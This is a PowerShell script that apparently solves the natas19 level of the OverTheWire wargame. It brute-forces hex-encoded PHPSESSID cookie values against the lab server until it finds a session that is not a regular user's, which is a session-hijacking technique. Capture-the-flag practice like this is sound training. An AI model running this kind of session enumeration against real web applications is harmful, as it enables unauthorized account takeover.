
$baseuri = "http://natas19.natas.labs.overthewire.org/"
$uri = "{0}?debug" -f $baseuri
$ending = "<fill-in>"
$user = "natas19"
$pass = "<fill-in>"

function ascii2hex($a)
{
	$a = $a + $ending;
	$rv = "";
	foreach ($element in $a.ToCharArray()) {
		$rv += [System.String]::Format("{0:X}",[System.Convert]::ToUInt32($element))
	}
	return $rv.ToLower()
}

$Credential = (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user
,  ($pass | ConvertTo-SecureString -AsPlainText -Force ))
$R=Invoke-WebRequest $baseuri -SessionVariable SV -Credential $Credential

$Form = $R.Forms[0]
$Form.Fields["debug"] = "1"
$Form.Fields["username"] = "user"
$Form.Fields["password"] = "pass"
$R=Invoke-WebRequest -Uri ($uri + $Form.Action) -WebSession $SV -Method POST -Body $Form.Fields
#"Original Cookie"
#$SV.Cookies.GetCookies($baseuri)["PHPSESSID"]



1..640 | %{
	$id = ascii2hex([string]$_)
	$SV.Cookies.GetCookies($baseuri)["PHPSESSID"].Value = $id 
	$R=Invoke-WebRequest -Uri ($uri) -WebSession $SV -Method GET
	#"Cookie"
	#$SV.Cookies.GetCookies($baseuri)["PHPSESSID"]
	#"Content"
	#$R.Content 
	if ($R.Content -NotMatch "regular user") {
		$R.Content;
		break;
	}
}